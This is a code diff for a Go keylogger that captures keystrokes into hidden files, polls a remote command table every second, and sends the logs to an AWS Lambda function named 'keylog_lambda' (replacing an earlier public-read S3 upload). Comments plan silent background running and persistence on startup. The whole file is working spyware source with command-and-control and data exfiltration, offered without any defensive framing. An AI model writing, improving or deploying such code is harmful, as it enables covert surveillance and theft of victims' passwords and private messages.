@@ -4,27 +4,60 @@ import (
 	"fmt"
 	"os"
 	"time"
+	"strings"
+	"encoding/json"
 	"github.com/robotn/gohook"
 	"github.com/joho/godotenv"
 
 	"github.com/aws/aws-sdk-go/aws"
 	"github.com/aws/aws-sdk-go/aws/session"
-	"github.com/aws/aws-sdk-go/service/s3"
-	"github.com/aws/aws-sdk-go/service/dynamodb"
+	"github.com/aws/aws-sdk-go/service/lambda"
 )
 
 // TO IMPLEMENT:
 // Make it run silently in the bg
 // Find a way to implement boot on startup
 
+type keylog_lambda struct {
+	Function   string `json:"function"`
+	HostName   string `json:"hostName"`
+	Cmd        string `json:"cmd"`
+}
 
-func main() {
+type file_upload struct {
+	Function string `json:"function"`
+	HostName string `json:"hostName"`
+	FileName string `json:"fileName"`
+	FileData []byte `json:"fileData"`
+}
 
+
+type response struct {
+	StatusCode int    `'json:"statusCode"`
+	Body 	   string `'json:"body"`
+}
+
+
+//Global values :
+var (
+	client *lambda.Lambda
+)
+
+func init() {
 	err := godotenv.Load()
 	if err != nil {
 		panic(err)
 	}
 
+
+	sess := session.Must(session.NewSessionWithOptions(session.Options{
+		SharedConfigState: session.SharedConfigEnable,
+	}))
+	
+	client = lambda.New(sess, &aws.Config{Region: aws.String("ap-southeast-2")})
+}
+
+func main() {
 	hostName, err := os.Hostname()
 	if err != nil {
 		panic(err)
@@ -52,7 +85,7 @@ func main() {
 			go startKeylog(hostName, fileName, cmdChan)
 		}
 		if cmd == "upload" {
-			go uploadFile(fileName, count)
+			go uploadFile(fileName, hostName)
 			count++
 			hook.StopEvent()
 		}
@@ -66,7 +99,7 @@ func pollCmds(hostName string, cmdChan chan<- string) {
 	var lastCmd string
 
 	for {
-		time.Sleep(5 * time.Second)
+		time.Sleep(1 * time.Second)
 		cmd := getCmd(hostName)
 		if cmd != lastCmd { 
 			lastCmd = cmd
@@ -107,26 +140,28 @@ func startKeylog(hostName string, fileName string, cmdChan chan string) {
 	}
 }
 
-func uploadFile(fileName string, count int) error {
-
-	file, err := os.Open(fileName)
+func uploadFile(fileName string, hostName string) error {
+	file, err := os.ReadFile(fileName)
 	if err != nil {
 		panic(err)
 	}
-	defer file.Close()
 
-	sess := session.Must(session.NewSession(&aws.Config{
-		Region: aws.String("ap-southeast-2"),
-	}))
+	request := file_upload {
+		Function: 	"upload_file",
+		HostName: 	hostName,
+		FileName: 	fileName,
+		FileData: 	file,
+	}
 
-	s3client := s3.New(sess)
+	payload, err := json.Marshal(request)
+	if err != nil {
+		panic(err)
+	}
 
-	_, err = s3client.PutObject(&s3.PutObjectInput{
-		Bucket: aws.String("vialathor-keylog"),
-		Key:    aws.String(fileName),
-		Body:   file,
-		ACL:    aws.String("public-read"),
-	})
+	_, err = client.Invoke(&lambda.InvokeInput{FunctionName: aws.String("keylog_lambda"), Payload: payload})
+	if err != nil {
+		panic(err)
+	}
 
 	os.Remove(fileName)
 
@@ -134,124 +169,47 @@ func uploadFile(fileName string, count int) error {
 }
 
 func getCmd(hostName string) string {
-
-	svc := dynamodb.New(session.New())
-	input := &dynamodb.GetItemInput{
-		TableName: aws.String("Keylog-table"),
-		Key: map[string]*dynamodb.AttributeValue{
-			"hostName": {
-				S: aws.String(hostName),
-			},
-		},
+	request := keylog_lambda{
+		Function:   "get_cmd",
+		HostName: 	hostName,
+		Cmd:      	"",
 	}
 
-	result, err := svc.GetItem(input)
+	payload, err := json.Marshal(request)
 	if err != nil {
 		panic(err)
 	}
 
-	cmd := result.Item["curr_cmd"]
-
-	return *cmd.S
-
+	result, err := client.Invoke(&lambda.InvokeInput{FunctionName: aws.String("keylog_lambda"), Payload: payload})
+	
+	var lambdaResp response
+	err = json.Unmarshal(result.Payload, &lambdaResp)
+	if err != nil {
+		panic(err)
+	}
+	
+	cmd := lambdaResp.Body
+	cmd = strings.Trim(cmd, `"`)
+	
+	return cmd
 }
 
 func putHost(hostName string) error {
-
-	svc := dynamodb.New(session.New())
-	input := &dynamodb.PutItemInput{
-		TableName:	aws.String("Keylog-table"),
-		Item:		map[string]*dynamodb.AttributeValue{
-			"hostName": {
-				S: aws.String(hostName),
-			},
-			"curr_cmd": {
-				S: aws.String("idle"),
-			},
-		},
+	request := keylog_lambda {
+		Function:   "set_cmd",
+		HostName: 	hostName,
+		Cmd:      	"idle",
 	}
 
-	_, err := svc.PutItem(input)
+	payload, err := json.Marshal(request)
+	if err != nil {
+		panic(err)
+	}
+
+	_, err = client.Invoke(&lambda.InvokeInput{FunctionName: aws.String("keylog_lambda"), Payload: payload})
 	if err != nil {
 		panic(err)
 	}
 
 	return err
 }
-
-// func keylog(string hostName) {
-
-// 	// Start the listening process
-// 	evChan := hook.Start()
-// 	defer hook.End()
-
-// 	var lastTime time.Time
-// 	runTime := time.Now()
-
-// 	// hostName, err := os.Hostname()
-// 	// if err != nil {
-// 	// 	panic(err)
-// 	// }
-
-// 	// need to test if the name actually changes.
-// 	fileName := fmt.Sprintf(".%s - %s %s.txt",
-// 	hostName,
-// 	runTime.Format("Jan 02 2006"),
-// 	runTime.Format(time.Kitchen))
-
-// 	file, err := os.Create(fileName)
-// 	if err != nil {
-// 		panic(err)
-// 	}
-// 	defer file.Close()
-
-// 	for ev := range evChan {
-// 		if ev.Kind == hook.KeyDown {
-// 			// 27 == esc - temp
-// 			if ev.Keychar == 27 {
-// 				err = uploadFile(fileName)
-// 				os.Remove(fileName)
-// 				if err != nil {
-// 					panic(err)
-// 				}
-// 				break
-// 			}
-
-// 			// To change - Idk if i should set this to 1 hr / 6 hrs ?
-// 			if time.Since(runTime).Minutes() >= 1 {
-// 				err = uploadFile(fileName)
-// 				os.Remove(fileName)
-// 				if err != nil {
-// 					panic(err)
-// 				}
-// 				file.Close()
-// 				fileName := fmt.Sprintf(".%s - %s %s.txt",
-// 				hostName,
-// 				runTime.Format("Jan 02 2006"),
-// 				runTime.Format(time.Kitchen))
-// 				file, err = os.Create(fileName)
-// 				if err != nil {
-// 					panic(err)
-// 				}
-// 				runTime = time.Now()
-// 			}
-
-// 			// Calcs diff between time
-// 			now := time.Now()
-// 			var diff time.Duration
-// 			if !lastTime.IsZero() {
-// 				diff = now.Sub(lastTime)
-// 			}
-// 			lastTime = now
-
-// 			// If diff > 5 print a new line for ease of reading
-// 			if diff.Seconds() > 5 {
-// 				file.WriteString("\n")
-// 			}
-
-// 			// Print to file any keystroke recorded and their keychar value
-// 			file.WriteString(hook.RawcodetoKeychar(ev.Rawcode))
-
-// 		}
-// 	}
-// }
